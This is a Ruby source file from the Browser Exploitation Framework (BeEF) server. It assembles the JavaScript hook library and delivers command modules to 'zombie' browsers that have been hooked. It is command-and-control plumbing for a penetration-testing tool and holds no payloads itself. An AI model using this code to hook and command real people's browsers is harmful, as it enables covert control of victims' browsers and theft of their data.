module BeEF
module Server
module Modules
  
  #
  # Purpose: avoid rewriting several times the same code.
  #
  module Common
    
    #
    # Builds the default beefjs library (all default components of the library).
    #
    # @param: {Object} the hook session id
    # @param: {Boolean} if the framework is already loaded in the hooked browser
    #
    def build_beefjs!(hook_session_id, framework_loaded = false)

      # set up values required to construct beefjs
      beefjs = '' #  init the beefjs string (to be sent as the beefjs file)
      beefjs_path = "#{$root_dir}/modules/beefjs/" # location of sub files      
      js_sub_files = %w(beef.js browser.js browser/cookie.js dom.js net.js updater.js encode/base64.js init.js geolocation.js)

      # construct the beefjs string from file(s)
      js_sub_files.each {|js_sub_file_name|
        js_sub_file_abs_path = beefjs_path + js_sub_file_name # construct absolute path
        beefjs << (File.read(js_sub_file_abs_path) + "\n\n") # concat each js sub file
      }
      
      # create the config for the hooked browser session
      config = BeEF::Configuration.instance
      hook_session_name = config.get('hook_session_name')
      hook_session_config = BeEF::HttpHookServer.instance.to_h
      hook_session_config['beef_hook_session_name'] = hook_session_name
      hook_session_config['beef_hook_session_id'] = hook_session_id
      
      # populate place holders in the beefjs string and set the response body
      eruby = Erubis::FastEruby.new(beefjs)
      @body << eruby.evaluate(hook_session_config)
  
    end
    
    #
    # Builds missing beefjs components.
    #
    # Ex: build_missing_beefjs_components(['beef.net.local', 'beef.net.requester'])
    #
    def build_missing_beefjs_components(beefjs_components)
      # if the component is of type String, we convert it to an array
      beefjs_components = [beefjs_components] if beefjs_components.is_a? String
      
      # verifies that @beef_js_cmps is not nil to avoid bugs
      @beef_js_cmps = '' if @beef_js_cmps.nil?
      
      beefjs_components.each {|c|
        next if @beef_js_cmps.include? c
        
        # we generate the component's file path
        component_path = c
        component_path.gsub!(/beef./, '')
        component_path.gsub!(/\./, '/')
        component_path.replace "#{$root_dir}/modules/beefjs/#{component_path}.js"
        
        # exception in case the component cannot be found
        raise "Could not build the BeEF JS component: file does not exists" if not File.exists?(component_path)
        
        # we output the component to the hooked browser
        @body << File.read(component_path)+"\n\n"
        
        # finally we add the component to the list of components already generated so it does not
        # get generated numerous times.
        @beef_js_cmps += ",#{component_path}"
      }
    end
    
    #
    # Adds the command module instructions to the http response.
    #
    def add_command_instructions(command, zombie)

      raise WEBrick::HTTPStatus::BadRequest, "zombie is nil" if zombie.nil?
      raise WEBrick::HTTPStatus::BadRequest, "zombie.session is nil" if zombie.session.nil?
      raise WEBrick::HTTPStatus::BadRequest, "zombie is nil" if command.nil?
      raise WEBrick::HTTPStatus::BadRequest, "zombie.session is nil" if command.command_module_id.nil?

      # get the command module
      command_module = BeEF::Models::CommandModule.first(:id => command.command_module_id)      
      raise WEBrick::HTTPStatus::BadRequest, "command_module is nil" if command_module.nil?
      raise WEBrick::HTTPStatus::BadRequest, "command_module.path is nil" if command_module.path.nil?

      klass = File.basename command_module.path, '.rb'

      @guard.synchronize {
        command_module = BeEF::Modules::Commands.const_get(klass.capitalize).new
        command_module.command_id = command.id
        command_module.session_id = zombie.session
        command_module.build_datastore(command.data)
        command_module.pre_send
        
        if not @beef_js_cmps.nil? and not command_module.beefjs_components.empty?
          command_module.beefjs_components.keys.each{|component|
            next if @beef_js_cmps.include? component
            #TODO: code that part so it uses the function build_missing_beefjs_components()
            
            @body << File.read(command_module.beefjs_components[component])+"\n\n"
            @beef_js_cmps += ",#{component}"
          }
        end
        
        @body << command_module.output + "\n\n"
        
        puts "+ Hooked browser #{zombie.ip} sent command module #{klass}" if @cmd_opts[:verbose]
        
      }
    end
    
    #
    # Executes every plugins in the framework.
    #
    def execute_plugins!
      #TODO
    end

  end
  
end
end
end